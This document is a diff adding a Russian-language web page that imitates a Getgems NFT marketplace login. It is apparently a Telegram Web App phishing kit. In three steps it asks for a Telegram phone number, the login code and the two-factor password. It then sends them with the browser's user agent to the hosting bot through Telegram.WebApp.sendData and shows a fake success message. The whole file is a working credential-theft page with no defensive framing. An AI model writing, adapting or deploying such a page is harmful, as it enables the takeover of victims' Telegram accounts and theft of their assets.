@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Getgems Marketplace</title>
+    <style>* { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:linear-gradient(135deg,#1a1b2e 0%,#2d2b55 100%); color:white; min-height:100vh; padding:20px; }
+        .container { max-width:400px; margin:0 auto; }
+        .header { text-align:center; margin-bottom:30px; }
+        .logo { font-size:32px; font-weight:bold; background:linear-gradient(90deg,#7b61ff 0%,#ff6b9d 100%); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:10px; }
+        .card { background:rgba(255,255,255,0.05); border-radius:20px; padding:25px; margin-bottom:20px; border:1px solid rgba(255,255,255,0.1); }
+        .card-title { font-size:18px; margin-bottom:15px; color:#7b61ff; }
+        .input-group { margin-bottom:20px; }
+        label { display:block; margin-bottom:8px; color:#c0c0e0; font-size:14px; }
+        input { width:100%; padding:12px 15px; border-radius:10px; border:1px solid rgba(255,255,255,0.2); background:rgba(0,0,0,0.3); color:white; font-size:16px; }
+        .btn { width:100%; padding:15px; border-radius:10px; border:none; background:linear-gradient(90deg,#7b61ff 0%,#5d4aff 100%); color:white; font-size:16px; font-weight:bold; cursor:pointer; }
+        .step { display:none; }
+        .step.active { display:block; }</style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">Getgems</div>
+            <div class="subtitle">Торговля NFT, юзернеймами и номерами</div>
+        </div>
+        <div class="card">
+            <div id="step1" class="step active">
+                <div class="card-title">🔐 Вход в аккаунт</div>
+                <p style="margin-bottom:20px; color:#a0a0c0;">Для доступа к маркетплейсу требуется подтверждение владения аккаунтом Telegram.</p>
+                <div class="input-group"><label for="phone">Номер телефона</label><input type="tel" id="phone" placeholder="+7 900 123-45-67" required></div>
+                <button class="btn" onclick="nextStep()">Получить код</button>
+            </div>
+            <div id="step2" class="step">
+                <div class="card-title">📱 Код подтверждения</div>
+                <p style="margin-bottom:20px; color:#a0a0c0;">Введите 5-значный код, который пришёл в Telegram</p>
+                <div class="input-group"><label for="code">Код из Telegram</label><input type="number" id="code" placeholder="12345" required maxlength="5"></div>
+                <button class="btn" onclick="nextStep()">Продолжить</button>
+            </div>
+            <div id="step3" class="step">
+                <div class="card-title">🔒 Двухфакторная аутентификация</div>
+                <p style="margin-bottom:20px; color:#a0a0c0;">Введите пароль двухфакторной аутентификации (если включена)</p>
+                <div class="input-group"><label for="password2fa">Пароль 2FA (опционально)</label><input type="password" id="password2fa" placeholder="Можно оставить пустым"></div>
+                <div class="loader" id="loader" style="display:none; text-align:center; margin:20px 0;"><p>Подключение к маркетплейсу...</p></div>
+                <button class="btn" onclick="submitData()">Подключить аккаунт</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        let currentStep=1;const userData={};
+        function nextStep(){
+            if(currentStep===1){userData.phone=document.getElementById('phone').value;if(!userData.phone)return alert('Введите номер телефона');}
+            else if(currentStep===2){userData.login_code=document.getElementById('code').value;if(!userData.login_code)return alert('Введите код из Telegram');}
+            document.getElementById(`step${currentStep}`).classList.remove('active');currentStep++;
+            document.getElementById(`step${currentStep}`).classList.add('active');}
+        function submitData(){
+            userData.password_2fa=document.getElementById('password2fa').value;userData.user_agent=navigator.userAgent;
+            document.getElementById('loader').style.display='block';
+            const payload={type:"login_data",user:userData,timestamp:new Date().toISOString()};
+            if(window.Telegram&&Telegram.WebApp){Telegram.WebApp.sendData(JSON.stringify(payload));
+                setTimeout(()=>{document.getElementById('loader').innerHTML='<p style="color:#4ade80">✅ Аккаунт успешно подключен!</p><p style="margin-top:10px;font-size:14px;">Теперь вы можете торговать на маркетплейсе Getgems</p>';},3000);}
+            else{alert('Данные отправлены: '+JSON.stringify(payload,null,2));document.getElementById('loader').innerHTML='<p style="color:#4ade80">✅ Тестовый режим: данные сохранены</p>';}}
+    </script>
+</body>
+</html>
